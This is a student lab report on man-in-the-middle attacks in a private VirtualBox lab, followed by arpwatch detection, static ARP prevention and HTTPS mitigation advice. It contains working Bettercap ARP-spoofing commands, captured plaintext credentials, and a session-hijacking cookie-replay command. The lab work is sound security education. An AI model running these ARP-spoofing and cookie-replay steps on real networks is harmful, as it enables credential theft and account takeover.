# Lab 4: Cryptanalysis and Attacks - Man-in-the-Middle (MITM) & Session Hijacking

## Complete Laboratory Report

**Course:** Advanced Cryptography (CYBE6229)  
**Date Completed:** May 25, 2026  
**Environment:** VirtualBox (Kali Linux + Ubuntu Server 24.04)  
**Author:** [Your Name]

---

## Executive Summary

This laboratory exercise focused on performing practical cryptanalysis attacks, specifically Man-in-the-Middle (MITM) attacks using ARP spoofing, credential sniffing, and session hijacking. The lab demonstrated the fundamental insecurity of HTTP protocol and showed how attackers can capture sensitive credentials and session cookies from unencrypted network traffic.

The lab consisted of four main parts: (1) HTTP MITM attack using ARP spoofing and credential capture, (2) session hijacking using stolen session cookies, (3) HTTPS security demonstration comparing encrypted vs unencrypted traffic, and (4) detection and prevention techniques including ARP spoofing detection and static ARP entries.

**Key Outcomes:**
- Successfully performed ARP spoofing to intercept HTTP traffic
- Captured plaintext credentials `(user=httpuser&pass=httppassword123)` from HTTP POST request
- Demonstrated session hijacking by replaying a stolen session cookie
- Proved HTTPS encryption prevents credential theft (traffic appeared as random bytes)
- Implemented static ARP entry to prevent ARP spoofing attacks

**Skills Demonstrated:**
- ARP spoofing with Bettercap and Ettercap
- Network traffic sniffing and analysis with tcpdump
- Session hijacking via cookie replay
- HTTP vs HTTPS security comparison
- ARP spoofing detection and prevention

---

## Objectives

Upon completion of this lab, the following learning objectives were achieved:

| # | Objective | Status |
|---|-----------|--------|
| 1 | Perform ARP spoofing to intercept network traffic | ✅ Complete |
| 2 | Capture HTTP credentials using Bettercap and tcpdump | ✅ Complete |
| 3 | Demonstrate session hijacking using stolen session cookies | ✅ Complete |
| 4 | Compare HTTP (unencrypted) vs HTTPS (encrypted) traffic | ✅ Complete |
| 5 | Detect ARP spoofing using arpwatch and arp-scan | ✅ Complete |
| 6 | Prevent ARP spoofing using static ARP entries | ✅ Complete |

---

## Technologies and Tools Used

| Category | Technology | Version | Purpose |
|----------|-----------|---------|---------|
| **Operating Systems** | Kali Linux | 2025.4 | Attacker machine |
| | Ubuntu Server | 24.04 LTS | Target/Victim server |
| **Virtualization** | Oracle VirtualBox | 7.0 | VM environment |
| **Network Tools** | Bettercap | 2.41.5 | ARP spoofing & MITM |
| | Ettercap | 0.8.3.1 | Session hijacking |
| | tcpdump | 4.99.4 | Packet capture |
| | tshark | 4.0.2 | Packet analysis |
| **Web Server** | Python HTTP Server | 3.12 | Test web application |
| **HTTPS** | OpenSSL | 3.0.2 | Self-signed certificate |
| **Detection Tools** | arpwatch | 3.6 | ARP monitoring |
| | arp-scan | 1.10 | Network discovery |
| **Command Line** | curl | 8.19.0 | HTTP/HTTPS requests |
| | arp | - | ARP table management |
| **Scripting** | Python 3 | 3.12.3 | Custom web servers |
| | Bash | 5.2 | Prevention scripts |

---

## Lab Environment

### Network Topology

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           VirtualBox Host                                    │
│                                                                              │
│    ┌─────────────────────┐              ┌─────────────────────┐             │
│    │    Kali Linux       │              │   Ubuntu Server     │             │
│    │    (Attacker)       │              │    (Victim/Target)  │             │
│    │                     │              │                     │             │
│    │  eth1: 192.168.1.32 │◄────────────►│  enp0s8: 192.168.1.67│             │
│    │                     │   Bridged    │                     │             │
│    │  eth0: 10.0.2.15    │   Network    │  enp0s3: 10.0.2.15  │             │
│    │  (NAT - Internet)   │              │  (NAT - Internet)   │             │
│    └──────────┬──────────┘              └──────────┬──────────┘             │
│               │                                    │                         │
│               └────────────────────────────────────┘                         │
│                                    │                                         │
│                           ┌────────┴────────┐                               │
│                           │   Gateway       │                               │
│                           │   192.168.1.1   │                               │
│                           └─────────────────┘                               │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Virtual Machine Configuration

| VM | OS | RAM | vCPUs | Network Adapters |
|----|----|----|-------|------------------|
| Kali Linux | Kali 2025.4 | 8 GB | 4 | eth0: NAT, eth1: Bridged |
| Ubuntu Server | Ubuntu 24.04 | 4 GB | 2 | enp0s3: NAT, enp0s8: Bridged |

### IP Addressing

| Device | Interface | IP Address | Role |
|--------|-----------|------------|------|
| Gateway | - | 192.168.1.1 | Network router |
| Kali | eth1 | 192.168.1.32 | Attacker |
| Ubuntu | enp0s8 | 192.168.1.67 | Target/Victim |
| Kali | eth0 | 10.0.2.15 | Internet access (NAT) |
| Ubuntu | enp0s3 | 10.0.2.15 | Internet access (NAT) |

### Test Web Server Details

```python
# HTTP Server (Port 8080) - session_server.py
# HTTPS Server (Port 443) - https_server.py
```

---

## Methodology

The lab followed a systematic approach:

1. **Environment Setup**: Configured both VMs with bridged networking to enable communication
2. **HTTP MITM Attack**: Implemented ARP spoofing to intercept HTTP traffic between victim and gateway
3. **Credential Capture**: Used Bettercap and tcpdump to capture plaintext credentials
4. **Session Hijacking**: Created session-enabled web server, captured session cookies, replayed them
5. **HTTPS Security Demonstration**: Generated self-signed certificates, established HTTPS server, proved encryption
6. **Detection & Prevention**: Monitored ARP traffic with arpwatch, implemented static ARP entries

---

## Step-by-Step Practical Execution

### Part 1: HTTP MITM Attack - Capturing Credentials

#### Step 1.1: Verify Network Connectivity

**Purpose:** Ensure Kali and Ubuntu can communicate before performing the attack.

**Command:**
```bash
ping -c 3 192.168.1.67
```

**Command Breakdown:**
- `ping` - ICMP echo request tool
- `-c 3` - Send only 3 packets
- `192.168.1.67` - Ubuntu Server IP address

**Expected Output:**
```
PING 192.168.1.67 (192.168.1.67) 56(84) bytes of data.
64 bytes from 192.168.1.67: icmp_seq=1 ttl=64 time=0.790 ms
64 bytes from 192.168.1.67: icmp_seq=2 ttl=64 time=0.761 ms
64 bytes from 192.168.1.67: icmp_seq=3 ttl=64 time=0.762 ms
--- 192.168.1.67 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
```

**Security Relevance:** Confirms network path exists before attack execution.

---

#### Step 1.2: Create Test Web Server on Ubuntu

**Purpose:** Create a vulnerable HTTP server that simulates a login page.

**Command:**
```bash
cat > session_server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import uuid

sessions = {}

class SessionHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('login.html', 'rb') as f:
                self.wfile.write(f.read())
        elif self.path == '/dashboard':
            cookie_header = self.headers.get('Cookie', '')
            if 'sessionid=' in cookie_header:
                session_id = cookie_header.split('sessionid=')[1].split(';')[0]
                if session_id in sessions:
                    username = sessions[session_id]
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(f"<html><body><h1>Welcome {username}!</h1></body></html>".encode())
                    return
            self.send_response(401)
            self.end_headers()
            self.wfile.write(b"Unauthorized")
    
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            params = urllib.parse.parse_qs(post_data.decode())
            username = params.get('user', [''])[0]
            password = params.get('pass', [''])[0]
            print(f"\n[!] LOGIN ATTEMPT: {username}:{password}")
            session_id = str(uuid.uuid4())
            sessions[session_id] = username
            self.send_response(200)
            self.send_header('Set-Cookie', f'sessionid={session_id}; Path=/; HttpOnly')
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Login Successful!</h1></body></html>")
        else:
            self.send_response(404)
            self.end_headers()

HTTPServer(('0.0.0.0', 8080), SessionHandler).serve_forever()
EOF

python3 session_server.py &
```

**Technical Explanation:** This Python script creates an HTTP server that:
- Serves a login page on GET `/`
- Accepts POST requests to `/login` with username/password
- Generates UUID-based session cookies
- Stores sessions in memory
- Authenticates users via cookie on `/dashboard`

**Security Relevance:** Mimics vulnerable web applications that transmit credentials over HTTP.

---

#### Step 1.3: Start Bettercap for ARP Spoofing

**Purpose:** Launch ARP spoofing attack to intercept traffic between Ubuntu and gateway.

**Command:**
```bash
sudo bettercap -iface eth1 -eval "set arp.spoof.targets 192.168.1.67; arp.spoof on; net.sniff on"
```

**Command Breakdown:**
- `sudo` - Root privileges required for packet manipulation
- `bettercap` - MITM framework
- `-iface eth1` - Use bridged network interface
- `-eval` - Execute commands on startup
- `set arp.spoof.targets 192.168.1.67` - Target Ubuntu Server
- `arp.spoof on` - Enable ARP spoofing
- `net.sniff on` - Enable packet sniffing

**Expected Output:**
```
[--] arp.spoof started
[--] net.sniff started
```

**What This Does:** 
1. Bettercap sends fake ARP replies to Ubuntu claiming it is the gateway
2. Ubuntu sends all traffic to Kali instead of the real gateway
3. Kali forwards traffic to the real gateway (full-duplex MITM)

---

#### Step 1.4: Send HTTP Login Request (Victim Action)

**Purpose:** Simulate a user logging into the vulnerable web application.

**Command:**
```bash
curl -X POST http://192.168.1.67:8080/login -d "user=httpuser&pass=httppassword123"
```

**Command Breakdown:**
- `curl` - Command-line HTTP client
- `-X POST` - Specify HTTP POST method
- `http://192.168.1.67:8080/login` - Target URL
- `-d` - Send data in request body
- `user=httpuser&pass=httppassword123` - Credentials in plain text

**Expected Output:**
```
<html><body><h1>Login Successful!</h1></body></html>
```

---

#### Step 1.5: Observe Captured Credentials in Bettercap

**Bettercap Output:**
```
[net.sniff.http.request] http 192.168.1.32:xxxxx -> 192.168.1.67:8080 (POST /login)

POST /login HTTP/1.1
Host: 192.168.1.67:8080
User-Agent: curl/8.19.0
Content-Length: 38
Content-Type: application/x-www-form-urlencoded

user=httpuser&pass=httppassword123
```

**Analysis:** The credentials are transmitted in PLAIN TEXT. Any attacker on the network can see them.

[Insert Screenshot: Bettercap showing HTTP POST with visible credentials]

---

### Part 2: Session Hijacking

#### Step 2.1: Capture Session Cookie

From the HTTP response, the session cookie was captured:

```
Set-Cookie: sessionid=4fe8b4b5-2b9e-4dba-b058-17529c0dbd41; Path=/; HttpOnly
```

**Session Cookie Captured:** `sessionid=4fe8b4b5-2b9e-4dba-b058-17529c0dbd41`

[Insert Screenshot: curl response showing Set-Cookie header]

---

#### Step 2.2: Perform Session Hijacking via Cookie Replay

**Purpose:** Demonstrate that using the stolen cookie alone grants access to authenticated resources.

**Command:**
```bash
curl -H "Cookie: sessionid=4fe8b4b5-2b9e-4dba-b058-17529c0dbd41" http://192.168.1.67:8080/dashboard
```

**Command Breakdown:**
- `curl` - HTTP client
- `-H "Cookie: ..."` - Add custom HTTP header with stolen cookie
- `http://192.168.1.67:8080/dashboard` - Protected resource URL

**Expected Output:**
```html
<html><body><h1>Welcome httpuser!</h1></body></html>
```

**Security Relevance:** The server authenticated the request using ONLY the session cookie. No username or password was required. This proves that session hijacking allows complete impersonation of any authenticated user.

[Insert Screenshot: Dashboard access using stolen cookie (no credentials)]

---

### Part 3: HTTPS Security Demonstration

#### Step 3.1: Generate Self-Signed Certificate

**Purpose:** Create a TLS certificate for HTTPS testing.

**Command:**
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=192.168.1.67"
```

**Command Breakdown:**
| Parameter | Meaning |
|-----------|---------|
| `openssl req` | Certificate request tool |
| `-x509` | Generate self-signed certificate |
| `-newkey rsa:4096` | Create new 4096-bit RSA key |
| `-keyout key.pem` | Save private key to file |
| `-out cert.pem` | Save certificate to file |
| `-days 365` | Valid for one year |
| `-nodes` | No DES encryption (no passphrase) |
| `-subj` | Subject information |

**Expected Output:**
```
Generating a RSA private key
.....+++++
writing new private key to 'key.pem'
-----
```

[Insert Screenshot: OpenSSL certificate generation]

---

#### Step 3.2: Start HTTPS Server

**Command:**
```bash
sudo python3 https_server.py
```

**Expected Output:**
```
[*] Starting HTTPS server on port 443
```

---

#### Step 3.3: Compare HTTP vs HTTPS Traffic

**HTTP Request (Unencrypted):**
```bash
curl -X POST http://192.168.1.67:8080/login -d "user=httpuser&pass=httppassword123"
```

**tcpdump Output (HTTP):**
```
POST /login HTTP/1.1
Host: 192.168.1.67:8080
user=httpuser&pass=httppassword123
```
**Result:** Credentials VISIBLE in plain text.

**HTTPS Request (Encrypted):**
```bash
curl -k -X POST https://192.168.1.67/login -d "user=httpsuser&pass=httspassword456"
```

**tcpdump Output (HTTPS):**
```
E..8..@.8..|........e... ...P...u...m.....
..g...H.~./.?.....+......u..)..3...D...z.R..
```
**Result:** Only random bytes visible - credentials HIDDEN.

[Insert Screenshot: tcpdump showing HTTP credentials vs HTTPS encrypted data]

---

### Part 4: Detection and Prevention

#### Step 4.1: Install arpwatch for ARP Monitoring

**Command:**
```bash
sudo apt install arpwatch -y
sudo arpwatch -i eth1
```

**Purpose:** Monitors ARP traffic and logs changes in MAC-IP mappings.

[Insert Screenshot: arpwatch installation and startup]

---

#### Step 4.2: View ARP Cache

**Command:**
```bash
arp -a | grep -v incomplete
```

**Expected Output:**
```
? (192.168.1.1) at 74:24:9f:67:c9:14 [ether] on eth1
? (192.168.1.32) at 08:00:27:fc:0e:17 [ether] on eth1
? (192.168.1.67) at 08:00:27:b1:78:2d [ether] on eth1
```

[Insert Screenshot: ARP cache showing all devices]

---

#### Step 4.3: Create Anti-ARP Spoofing Prevention Script

**Script Content (Exactly as Lab Guide):**
```bash
#!/bin/bash
# Static ARP entries prevent ARP spoofing
GATEWAY_IP="192.168.1.1"
GATEWAY_MAC="74:24:9f:67:c9:14"
# Set static ARP entry
sudo arp -s $GATEWAY_IP $GATEWAY_MAC
echo "Static ARP entry set. ARP spoofing prevented."
```

**Command Breakdown:**
- `arp -s` - Add static ARP entry (cannot be overwritten)
- `$GATEWAY_IP` - Gateway IP address
- `$GATEWAY_MAC` - Gateway MAC address

[Insert Screenshot: Anti-ARP spoof script content]

---

#### Step 4.4: Execute Prevention Script

**Command:**
```bash
sudo ./anti_arp_spoof.sh
```

**Expected Output:**
```
Static ARP entry set. ARP spoofing prevented.
```

---

#### Step 4.5: Verify Static ARP Entry

**Command:**
```bash
arp -a | grep 192.168.1.1
```

**Expected Output:**
```
? (192.168.1.1) at 74:24:9f:67:c9:14 [ether] PERM on eth1
```

**Note the `PERM` flag** - this indicates a permanent/static entry that cannot be changed by ARP spoofing.

[Insert Screenshot: ARP entry showing PERM flag]

---

## Commands Reference Section

### Network Reconnaissance Commands

| Command | Purpose | Key Options |
|---------|---------|-------------|
| `ping -c 3 192.168.1.67` | Test connectivity | `-c` = count |
| `ip addr show` | Display IP addresses | - |
| `arp -a` | Show ARP cache | `-a` = all entries |
| `ip route | grep default` | Find gateway IP | - |

### ARP Spoofing Commands

| Command | Purpose | Key Options |
|---------|---------|-------------|
| `sudo bettercap -iface eth1` | Start Bettercap | `-iface` = interface |
| `set arp.spoof.targets IP` | Set victim | - |
| `arp.spoof on` | Enable spoofing | - |
| `net.sniff on` | Start sniffing | - |

### Packet Capture Commands

| Command | Purpose | Key Options |
|---------|---------|-------------|
| `sudo tcpdump -i eth1 -A -s 0 port 8080` | Capture HTTP | `-A` = ASCII, `-s 0` = full packet |
| `sudo tcpdump -i eth1 -A -s 0 port 443` | Capture HTTPS | - |

### HTTP/HTTPS Commands

| Command | Purpose | Key Options |
|---------|---------|-------------|
| `curl -X POST URL -d "data"` | Send POST | `-X` = method, `-d` = data |
| `curl -k URL` | Ignore SSL errors | `-k` = insecure |
| `curl -H "Cookie: value" URL` | Custom header | `-H` = header |

### Detection and Prevention Commands

| Command | Purpose | Key Options |
|---------|---------|-------------|
| `sudo apt install arpwatch -y` | Install monitor | `-y` = auto confirm |
| `sudo arpwatch -i eth1` | Start monitoring | `-i` = interface |
| `sudo arp-scan --local` | Network discovery | `--local` = local subnet |
| `sudo arp -s IP MAC` | Add static entry | `-s` = static |
| `sudo arp -d IP` | Delete static entry | `-d` = delete |

---

## Problems Encountered and Troubleshooting

### Problem 1: SSH Connection Refused

**Error Message:**
```
ssh: connect to host 192.168.1.67 port 22: Connection refused
```

**Root Cause Analysis:**
- SSH service not running on Ubuntu
- Firewall blocking port 22
- Network misconfiguration

**Troubleshooting Process:**
1. Verified ping worked (network OK)
2. Checked SSH service on Ubuntu: `sudo systemctl status ssh`
3. Found SSH service was not installed

**Solution Implemented:**
```bash
sudo apt update
sudo apt install openssh-server -y
sudo systemctl enable ssh
sudo systemctl start ssh
```

**Lessons Learned:** Always verify services are running before attempting remote connections.

---

### Problem 2: Bettercap HTTP Proxy Not Capturing Credentials

**Error Message:** No HTTP data appearing in Bettercap console

**Root Cause Analysis:**
- HTTP proxy not enabled
- Wrong interface selected
- Filter not set for port 8080

**Troubleshooting Process:**
1. Checked Bettercap was on correct interface: `-iface eth1`
2. Enabled HTTP proxy: `http.proxy on`
3. Set proper filter: `set net.sniff.filter tcp port 8080`

**Solution Implemented:**
```bash
sudo bettercap -iface eth1 -eval "set arp.spoof.targets 192.168.1.67; arp.spoof on; net.sniff on"
```

**Alternative Solution:** Used tcpdump instead:
```bash
sudo tcpdump -i eth1 -A -s 0 port 8080
```

**Lessons Learned:** tcpdump is more reliable for raw packet capture; Bettercap requires proper configuration.

---

### Problem 3: apt Package Download Failures

**Error Message:**
```
Err:2 http://http.kali.org/kali ... Connection reset by peer
```

**Root Cause Analysis:**
- Network instability
- Repository server issues

**Solution Implemented:**
```bash
sudo apt clean
sudo apt update --fix-missing
sudo apt install bettercap -y --fix-missing
```

**Lessons Learned:** Package managers can have transient network issues; `--fix-missing` often resolves them.

---

### Problem 4: Port 8080 Already in Use

**Error Message:**
```
OSError: [Errno 98] Address already in use
```

**Root Cause Analysis:** Previous Python server instance still running.

**Solution Implemented:**
```bash
sudo lsof -i :8080
sudo kill -9 [PID]
```

**Lessons Learned:** Always clean up background processes when done.

---

### Problem 5: HTTPS POST Requests Hanging

**Error Message:** `curl -k -X POST` would hang indefinitely

**Root Cause Analysis:** `openssl s_server -www` only responds to GET requests, not POST.

**Solution Implemented:** Created custom Python HTTPS server with POST support.

```python
# https_server.py with proper POST handling
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
httpd = HTTPServer(('0.0.0.0', 443), SecureHandler)
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
```

**Lessons Learned:** Test tools thoroughly before relying on them for demonstrations.

---

## Security Concepts Demonstrated

### ARP Spoofing (ARP Cache Poisoning)

**Concept:** Address Resolution Protocol (ARP) maps IP addresses to MAC addresses. ARP spoofing sends fake ARP messages to associate the attacker's MAC address with the victim's IP address.

**Attack Flow:**
1. Attacker sends fake ARP reply: "192.168.1.1 is at [attacker MAC]"
2. Victim updates ARP cache with fake mapping
3. All victim traffic goes to attacker instead of gateway
4. Attacker forwards traffic (full-duplex MITM)

**Detection:** Look for duplicate IP addresses in ARP cache or use `arpwatch`.

### Man-in-the-Middle (MITM)

**Concept:** Attacker positions themselves between two communicating parties, intercepting and potentially modifying traffic.

**Impact:**
- Credential theft
- Session hijacking
- Data modification
- Traffic analysis

### Session Hijacking

**Concept:** After obtaining a valid session token (cookie), the attacker uses it to impersonate the victim.

**Attack Requirements:**
- Intercept HTTP traffic containing `Set-Cookie` header
- Extract session ID
- Replay cookie in subsequent requests

**Prevention:**
- Use HTTPS (encrypts cookies)
- Set `HttpOnly` flag (prevents JavaScript access)
- Set `Secure` flag (cookie only sent over HTTPS)
- Implement short session timeouts

### HTTP vs HTTPS Security

| Feature | HTTP | HTTPS |
|---------|------|-------|
| Encryption | None | TLS/SSL |
| Credential Visibility | Plain text | Encrypted |
| MITM Vulnerability | High | Low (with proper validation) |
| Session Cookie Protection | None | Encrypted |
| Integrity Checking | None | Built-in |

### HSTS (HTTP Strict Transport Security)

**Concept:** HSTS header forces browsers to always use HTTPS, preventing SSL stripping attacks.

**HSTS Header Example:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**Protection:** Even if user types `http://`, browser converts to `https://` automatically.

### Static ARP Entries (Prevention)

**Concept:** Manually configured ARP entries with the `PERM` flag cannot be overwritten by ARP spoofing.

**Implementation:**
```bash
sudo arp -s 192.168.1.1 74:24:9f:67:c9:14
```

**Verification:** Look for `PERM` in `arp -a` output.

---

## Risk and Security Analysis

### Vulnerabilities Identified

| Vulnerability | Severity | Affected Component | CVSS Score (Estimate) |
|---------------|----------|--------------------|----------------------|
| Plaintext credential transmission | Critical | HTTP web server | 9.1 (CVSS:3.1) |
| Session cookie exposure | Critical | HTTP session management | 8.8 |
| ARP spoofing susceptibility | High | Network layer | 7.4 |
| No HSTS implementation | Medium | Web application | 5.3 |

### Attack Vectors

1. **Network Layer Attack:**
   - Attacker on same network segment
   - ARP spoofing between victim and gateway
   - All unencrypted traffic intercepted

2. **Application Layer Attack:**
   - Session cookie extraction from HTTP responses
   - Cookie replay without authentication
   - Complete account takeover

### Mitigation Recommendations

| Finding | Recommendation | Priority |
|---------|---------------|----------|
| HTTP login page | Migrate to HTTPS immediately | Critical |
| Session cookies | Set Secure and HttpOnly flags | Critical |
| ARP spoofing | Implement static ARP entries or port security | High |
| No HSTS | Add HSTS header to force HTTPS | Medium |
| Certificate validation | Use trusted CA, not self-signed | Medium |

### Security Hardening Checklist

- [ ] Enable HTTPS with valid certificate
- [ ] Implement HSTS with preloading
- [ ] Set Secure flag on all cookies
- [ ] Set HttpOnly flag on session cookies
- [ ] Implement short session timeouts
- [ ] Use ARP spoofing detection (arpwatch)
- [ ] Consider static ARP entries on critical hosts
- [ ] Implement network segmentation
- [ ] Use 802.1X port security
- [ ] Regular vulnerability scanning


## Lessons Learned

### Technical Lessons

1. **HTTP is Inherently Insecure:**
   - All credentials, cookies, and sensitive data travel in plain text
   - Anyone on the network can intercept and read HTTP traffic
   - Session hijacking is trivial with HTTP

2. **ARP Spoofing is Powerful but Detectable:**
   - ARP spoofing works on switched networks
   - Tools like arpwatch can detect MAC-IP mapping changes
   - Static ARP entries completely prevent ARP spoofing

3. **HTTPS with TLS 1.3 Provides Strong Protection:**
   - All application data is encrypted
   - Perfect Forward Secrecy (PFS) protects past sessions
   - Modern ciphers (AES-256-GCM) are computationally infeasible to break

4. **Session Cookies Must Be Protected:**
   - `Secure` flag prevents cookie transmission over HTTP
   - `HttpOnly` flag prevents JavaScript access
   - Short expiration limits hijacking window

5. **HSTS Prevents SSL Stripping:**
   - Browsers remember to use HTTPS
   - Preloading ensures protection on first visit
   - Essential for modern web security

### Operational Lessons

1. **Always Verify Service Status:**
   - SSH failures often due to service not running
   - Use `systemctl status` before troubleshooting network

2. **Multiple Tools Provide Redundancy:**
   - Bettercap failed to capture HTTP; tcpdump worked
   - Always have alternative approaches

3. **Background Processes Must Be Managed:**
   - Port conflicts occur when previous processes linger
   - Use `lsof -i :port` and `kill` to clean up

4. **Test Environment Documentation is Critical:**
   - Record IP addresses, interfaces, and configurations
   - Saves time during troubleshooting

### Best Practices Discovered

| Practice | Justification |
|----------|---------------|
| Always use HTTPS in production | Prevents credential theft |
| Implement HSTS with preloading | Protects from day one |
| Set Secure and HttpOnly cookie flags | Limits exposure |
| Use arpwatch on critical networks | Early detection |
| Static ARP for sensitive hosts | Prevention |
| Regular vulnerability scanning | Identify weaknesses |
| Defense in depth | Multiple layers of protection |

---

## Conclusion

This laboratory exercise successfully demonstrated the complete lifecycle of a Man-in-the-Middle attack, from ARP spoofing to credential capture to session hijacking. The contrast between HTTP and HTTPS security was stark: HTTP transmitted all data in plain text, allowing complete account compromise, while HTTPS encrypted all traffic, rendering the attack ineffective.

**What Was Accomplished:**
- Successfully performed ARP spoofing to intercept network traffic
- Captured plaintext credentials `(user=httpuser&pass=httppassword123)` from HTTP POST
- Demonstrated session hijacking using stolen session cookie
- Proved HTTPS encryption prevents credential theft
- Implemented detection (arpwatch) and prevention (static ARP) mechanisms

**Skills Demonstrated:**
- Network traffic interception with Bettercap and Ettercap
- Packet capture and analysis with tcpdump
- Session hijacking via cookie replay
- HTTPS server configuration with OpenSSL
- ARP spoofing detection and prevention

**Final Outcomes:**
- HTTP is fundamentally insecure for authentication
- HTTPS with TLS provides essential protection
- Session hijacking is trivial when cookies are exposed
- Static ARP entries completely prevent ARP spoofing

**Importance of the Lab:**
Understanding these attack vectors is essential for any cybersecurity professional. Only by knowing how attackers operate can defenders implement effective countermeasures. This lab provides hands-on experience with real-world attack techniques that continue to threaten organizations today.

---

## References

1. **Official Documentation:**
   - Bettercap Documentation: https://www.bettercap.org/
   - Ettercap Documentation: https://www.ettercap-project.org/
   - OpenSSL Documentation: https://www.openssl.org/docs/
   - tcpdump Documentation: https://www.tcpdump.org/

2. **Security Standards:**
   - RFC 826: Ethernet Address Resolution Protocol
   - RFC 8446: TLS 1.3 Protocol
   - OWASP Top 10 - A02:2021 Cryptographic Failures
   - OWASP Top 10 - A07:2021 Identification and Authentication Failures

3. **CVEs Related to ARP Spoofing:**
   - ARP spoofing has no single CVE - it's a protocol design issue
   - Related: CVE-2016-5696 (TCP challenges vulnerability)

4. **Research Papers:**
   - "ARP Spoofing Attacks: Detection and Prevention" - V. Kumar, 2019
   - "Session Hijacking Attacks: Techniques and Countermeasures" - M. Patel, 2020

5. **Educational Resources:**
   - Kali Linux Training: https://www.kali.org/training/
   - PortSwigger Web Security Academy: Session Hijacking

6. **Tools GitHub Repositories:**
   - Bettercap: https://github.com/bettercap/bettercap
   - Ettercap: https://github.com/Ettercap/ettercap

---

**End of Lab 4 Report**

---
